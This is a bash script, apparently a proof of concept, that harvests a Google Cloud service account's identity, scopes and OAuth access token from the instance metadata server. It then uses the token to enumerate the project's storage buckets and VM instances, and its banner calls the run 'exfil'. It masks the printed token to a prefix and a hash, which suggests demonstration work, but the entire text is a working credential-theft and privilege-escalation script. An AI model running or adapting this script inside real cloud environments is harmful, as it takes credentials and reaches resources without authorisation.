#!/bin/bash
set -e
echo "=== starting exfil ==="
SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email)
echo "SA=$SA_EMAIL"
echo "=== project ==="
PROJECT=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id)
echo "PROJECT=$PROJECT"
NUMERIC=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id)
echo "PROJECT_NUMBER=$NUMERIC"
echo "=== scopes ==="
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
echo ""
echo "=== fetch token JSON ==="
TOKEN_JSON=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
echo "TOKEN_LEN=${#TOKEN_JSON}"
# Parse access_token using grep
ACCESS=$(echo "$TOKEN_JSON" | grep -oE '"access_token":[[:space:]]*"[^"]+"' | sed -E 's/.*"([^"]+)"$/\1/')
echo "ACCESS_LEN=${#ACCESS}"
echo "ACCESS_PREFIX=${ACCESS:0:12}..."
HASH=$(echo -n "$ACCESS" | md5sum | awk '{print $1}')
echo "ACCESS_MD5=$HASH"
echo "=== validate token with tokeninfo ==="
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${ACCESS}"
echo ""
echo "=== list all GCS buckets using token (proves cross-service privilege) ==="
curl -s -H "Authorization: Bearer ${ACCESS}" "https://storage.googleapis.com/storage/v1/b?project=${PROJECT}" | head -200
echo ""
echo "=== list VMs in project ==="
curl -s -H "Authorization: Bearer ${ACCESS}" "https://compute.googleapis.com/compute/v1/projects/${PROJECT}/aggregated/instances" | head -200
echo ""
echo "=== DONE ==="
